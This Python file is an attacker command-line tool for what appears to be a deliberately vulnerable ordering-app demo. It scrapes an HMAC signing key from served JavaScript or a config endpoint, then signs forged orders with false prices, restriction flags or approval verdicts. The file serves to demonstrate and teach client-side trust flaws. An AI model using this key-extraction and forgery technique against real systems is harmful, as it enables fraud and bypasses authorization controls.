"""Browserless attacker CLI — one tool, one subcommand per client-side sink.

The logic lives in plain functions that take an ``httpx.Client``, so the scenarios are
testable without simulating terminal input. ``main`` only parses arguments and prints.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from collections.abc import Callable, Sequence
from dataclasses import dataclass, field

import httpx

from ..signing import canonical_order_string, sign

# Public fixture credentials for the low-privilege insider the demo casts as the attacker.
DEFAULT_ACCOUNT = "tech-avery"
DEFAULT_PASSWORD = "avery-ninebark-demo"
DEFAULT_WORK_ORDER = "WO-1001"
RESTRICTED_PART = "PN-7741"
RESTRICTED_PART_PRICE = 189_000

_KEY_RE = re.compile(r'SIGNING_KEY\s*=\s*"([^"]+)"')

Extractor = Callable[[httpx.Client, str], tuple[str, str]]


@dataclass
class AttackResult:
    sink: str
    extracted_value: str
    extracted_source: str
    request: dict[str, object]
    response_status: int
    response_body: dict[str, object]
    order_state: str | None
    notes: list[str] = field(default_factory=list)

    def render(self) -> str:
        lines = [
            f"# sink: {self.sink}",
            f"extracted: {self.extracted_value}",
            f"  from:    {self.extracted_source}",
            f"request:   {json.dumps(self.request)}",
            f"response:  {self.response_status} {json.dumps(self.response_body)}",
            f"outcome:   order state = {self.order_state}",
        ]
        lines += [f"note:      {n}" for n in self.notes]
        return "\n".join(lines)


def extract_key_from_source(client: httpx.Client, base_url: str) -> tuple[str, str]:
    """Read the HMAC key straight out of the served vulnerable client source."""

    source_url = f"{base_url}/static/app/client.js"
    match = _KEY_RE.search(client.get(source_url).text)
    if match is None:
        raise RuntimeError("No embedded signing key found in the served client.")
    return match.group(1), source_url


def extract_key_from_config(client: httpx.Client, base_url: str) -> tuple[str, str]:
    """Read the key out of the half-fixed variant's runtime config response — over the wire."""

    config_url = f"{base_url}/api/client-config"
    key = client.get(config_url).json().get("signing_key")
    if not key:
        raise RuntimeError("No runtime-delivered signing key in client-config.")
    return str(key), config_url


def login(client: httpx.Client, base_url: str, account: str, password: str) -> None:
    res = client.post(
        f"{base_url}/api/login", json={"account_id": account, "password": password}
    )
    if res.status_code != 200:
        raise RuntimeError(f"Login failed for {account}: {res.status_code}")


def _forge(
    base_url: str,
    *,
    sink: str,
    extractor: Extractor,
    note: str,
    account: str,
    password: str,
    part_number: str,
    work_order_id: str,
    unit_price_cents: int,
    restricted: bool,
    quantity: int,
    within_limit: bool | None,
    requires_supervisor: bool | None,
) -> AttackResult:
    with httpx.Client(timeout=15.0) as client:
        key, source = extractor(client, base_url)
        login(client, base_url, account, password)

        line_total = unit_price_cents * quantity
        order: dict[str, object] = {
            "part_number": part_number,
            "quantity": quantity,
            "work_order_id": work_order_id,
            "unit_price_cents": unit_price_cents,
            "restricted": restricted,
            "line_total_cents": line_total,
        }
        if within_limit is not None:
            order["within_limit"] = within_limit
        if requires_supervisor is not None:
            order["requires_supervisor"] = requires_supervisor

        signature = sign(
            key,
            canonical_order_string(
                part_number=part_number, quantity=quantity, work_order_id=work_order_id,
                unit_price_cents=unit_price_cents, restricted=restricted,
                line_total_cents=line_total, within_limit=within_limit,
                requires_supervisor=requires_supervisor,
            ),
        )
        res = client.post(
            f"{base_url}/api/orders", json=order,
            headers={"X-Ninebark-Signature": signature},
        )
        body = res.json() if res.headers.get("content-type", "").startswith(
            "application/json"
        ) else {}
        return AttackResult(
            sink=sink, extracted_value=key, extracted_source=source,
            request={"headers": {"X-Ninebark-Signature": signature}, "body": order},
            response_status=res.status_code, response_body=body,
            order_state=body.get("state") if isinstance(body, dict) else None,
            notes=[note],
        )


def forge_embedded_key_order(
    base_url: str,
    *,
    account: str = DEFAULT_ACCOUNT,
    password: str = DEFAULT_PASSWORD,
    part_number: str = RESTRICTED_PART,
    work_order_id: str = DEFAULT_WORK_ORDER,
    unit_price_cents: int = 1,
    restricted: bool = False,
    quantity: int = 1,
) -> AttackResult:
    """Forge false price/restriction fields; the server computes an honest verdict from them."""

    return _forge(
        base_url, sink="embedded-signing-key", extractor=extract_key_from_source,
        note="Valid signature over a false price and restriction; the server trusted them.",
        account=account, password=password, part_number=part_number,
        work_order_id=work_order_id, unit_price_cents=unit_price_cents,
        restricted=restricted, quantity=quantity, within_limit=None, requires_supervisor=None,
    )


def forge_client_verdict_order(
    base_url: str,
    *,
    account: str = DEFAULT_ACCOUNT,
    password: str = DEFAULT_PASSWORD,
    from_config: bool = False,
) -> AttackResult:
    """Keep the honest restricted price, but forge the client-computed verdict directly."""

    extractor = extract_key_from_config if from_config else extract_key_from_source
    sink = "runtime-key-signed-verdict" if from_config else "client-verdict"
    note = (
        "The key arrived over the wire from client-config; a forged, signed verdict still won."
        if from_config
        else "Honest price for a restricted part, but a forged verdict the server trusted."
    )
    return _forge(
        base_url, sink=sink, extractor=extractor, note=note,
        account=account, password=password, part_number=RESTRICTED_PART,
        work_order_id=DEFAULT_WORK_ORDER, unit_price_cents=RESTRICTED_PART_PRICE,
        restricted=True, quantity=1, within_limit=True, requires_supervisor=False,
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="keyjack-attack", description=__doc__)
    parser.add_argument("--base-url", required=True, help="Target application base URL")
    sub = parser.add_subparsers(dest="sink", required=True)
    sub.add_parser("embedded-key", help="Forge false facts with the shipped HMAC key")
    sub.add_parser("client-verdict", help="Forge the client-computed authorization verdict")
    sub.add_parser("half-fixed", help="Defeat the half-fixed variant via its runtime key")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    base_url = args.base_url.rstrip("/")
    if args.sink == "embedded-key":
        result = forge_embedded_key_order(base_url)
    elif args.sink == "client-verdict":
        result = forge_client_verdict_order(base_url)
    elif args.sink == "half-fixed":
        result = forge_client_verdict_order(base_url, from_config=True)
    else:  # pragma: no cover
        return 2
    print(result.render())
    return 0


if __name__ == "__main__":  # pragma: no cover
    sys.exit(main())
